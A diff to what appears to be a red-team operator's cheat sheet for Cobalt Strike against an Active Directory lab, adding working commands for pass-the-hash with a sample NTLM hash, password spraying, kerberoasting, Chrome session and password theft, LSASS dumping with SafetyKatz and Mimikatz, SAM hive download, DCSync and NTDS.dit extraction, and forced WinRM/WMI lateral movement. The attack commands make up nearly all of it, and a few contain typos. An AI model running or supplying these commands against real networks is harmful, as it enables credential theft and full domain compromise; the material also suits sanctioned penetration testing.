@@ -99,17 +99,22 @@ powershell-import --> RACE.ps1
 make_token AD\Admin password --> This tool requires Admin privileges on the remote system being targeted
 
 powershell Set-RemotePSRemoting -SamAccountName testuser -ComputerName ops-jumpbox.lab.com --> Force enable PS remoting for the specific user
-powershell Set-RemoteWMI -SamAccountName testuser -Computername ops-jumpbox.lab.com --> Force enable WMI for the specific user
+powershell Set-RemoteWMI -SamAccountName testuser -Computername ops-jumpbox.lab.com --> (Optional) Force enable WMI for the specific user
 
-# Move laterally in CS with WinRM for the specified user
+# Now we can move laterally in CS with WinRM for the specified user
 make_token AD\testuser password
 jump [winrm/winrm64] ops-jumpbox.lab.com LISTENER
 ```
 
 [Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash) - PS tools to perform SMB and WMI pass-the-hash attacks
 ```
-fill
+powershell-import 
+powerpick Invoke-WMIExec -Target 192.168.100.20 -Domain LAB.com -Username TEST -Hash F6F38B793DB6A94BA04A52F1D3EE92F0 -Command "command or launcher to execute" -verbose
+powerpick Invoke-SMBExec -Target 192.168.100.20 -Domain LAB.com -Username TEST -Hash F6F38B793DB6A94BA04A52F1D3EE92F0 -Command "command or launcher to execute" -verbose
 ```
+
+[Move Kit](https://github.com/0xthirteen/MoveKit)
+Aggressor script using execute-assembly, SharpMove and SharpRPD assemblies for doing lateral movement with various techniques
 
 ------------------------------------------------------------------------------------------
 ## Domain Privilege Escalation
@@ -120,22 +125,22 @@ fill
 [DomainPasswordSpray.ps1](https://github.com/dafthack/DomainPasswordSpray)
 ```
 powershell-import --> DomainPasswordSpray.ps1
-# Get the full domain user list
+# Get the full domain user list (Optional)
 powershell Get-DomainUserList -Domain lab.com -RemoveDisabled -RemovePotentialLockouts | Out-File -Encoding ascii userlist.txt
 
 # Password spray from a username and password list
 powershell Invoke-DomainPasswordSpray -UserList userlist.txt -PasswordList passlist.txt -Domain lab.com -OutFile sprayed-creds.txt
 
 # Auto spray a specific password on an auto-generated user list (very noisy)
-powershell Invoke-DomainPasswordSpray -Password Winter2020
+powershell Invoke-DomainPasswordSpray -Password Summer2021
 ```
-Rubeus brute-force password spraying
+Rubeus brute-force password spraying a single password or using a password file
 ```
 execute-assembbly C:\Rubeus.exe brute /password:Password123! /domain:lab.com /noticket /outfile:passes-sprayed.txt [/passwords:PASSWORDS_FILE>] [/user:USER | /users:USERS_FILE] [/creduser:DOMAIN\\USER & /credpassword:PASSWORD] [/dc:DOMAIN_CONTROLLER]  [/verbose] [/nowrap]
 ```
 
 ### Kerberoasting
-PowerView kerberoasting
+PowerView kerberoasting (Outdated and still reliant on PowerShell)
 ```
 # Get users with SPN set
 powershell Get-DomainUesr -SPN
@@ -162,10 +167,10 @@ execute-assembly C:\Rubeus.exe kerberoast /outfile:KerbHash.txt /user:testaccoun
 ### Chrome Session Stealing
 SharpDPAPI to dump domain master key (requires DA privileges)
 ```
-fill in
+
 ```
 
-SharpChrome - test
+SharpChrome to extract and decrypt a user's Chrome sessions/passwords
 ```
 # Dumping Chrome login passwords on remote machines
 
@@ -186,9 +191,13 @@ Dumping LSASS with [Out-Minidump.ps from PowerSploit](https://github.com/PowerSh
 ```
 powershell Get-Process | Out-Minidump -DumpFilePath C:\temp
 ```
-Extracting hashes offline from LSASS using Mimikatz
+Extract LSASS process with [SafetyKatz](https://github.com/GhostPack/SafetyKatz)
 ```
-mimikatz.exe log "privilege::debug" "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" "sekurlsa::wdigest" exit
+execute-assembly C:\SafetyKatz.exe --> Dumps LSASS process to .dmp file on the local system
+```
+Extracting passwords/hashes offline from LSASS dump using Mimikatz
+```
+mimikatz.exe log "privilege::debug" "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords /all" "sekurlsa::wdigest" exit (Run on your local box)
 ```
 
 ### SAM database dump using reg.exe (requries local Admin)
@@ -198,17 +207,32 @@ shell reg.exe save HKLM\security security.save
 shell reg.exe save HKLM\system system.save
 
 # Download SAM files then dump hahses offline using Secretsdump.py
-python secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
+download sam.save
+download security.save
+download system.save
+python secretsdump.py -sam sam.save -security security.save -system system.save LOCAL (Run on your local box)
 ```
 
-### NTDS.dit dump
-[Secretsdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py) to dump NTDS.dit remotely
+### NTDS.dit dump (all commands below require Domain Admin privileges!)
+
+[Invoke-DCSync.ps1](https://gist.github.com/monoxgas/9d238accd969550136db) to perform DCSync attacks remotely 
 ```
-fill
+powershell-import --> Invoke-DCSync.ps1
+
+# Perform DC Sync hash dump for all users in the target domain
+powershell Invoke-DCSync -Domain lab.local [-DomainController ops-dc01.lab.local] 
+
+# Perform DC Sync hash dump for all users in the specified group
+powershell Invoke-DCSync -Domain lab.local -GroupName "Domain Admins" | ft -wrap -autosize
+```
+[Copy-VSS.ps1 from Nishang toolkit](https://github.com/samratashok/nishang/blob/master/Gather/Copy-VSS.ps1) to dump NTDS.dit locally on the DC
+```
+powershell-import --> Copy-VSS.ps1
+powerpick Copy-VSS -DestinationDir C:\temp
 ```
 NTDSutil.exe to dump NTDS.dit locally on a Domain Controller
 ```
-fill
+shell activate instance ntds,ifm,create full C:\ntdsutil,quit,quit | ntdsutil
 ```
 
 ------------------------------------------------------------------------------------------
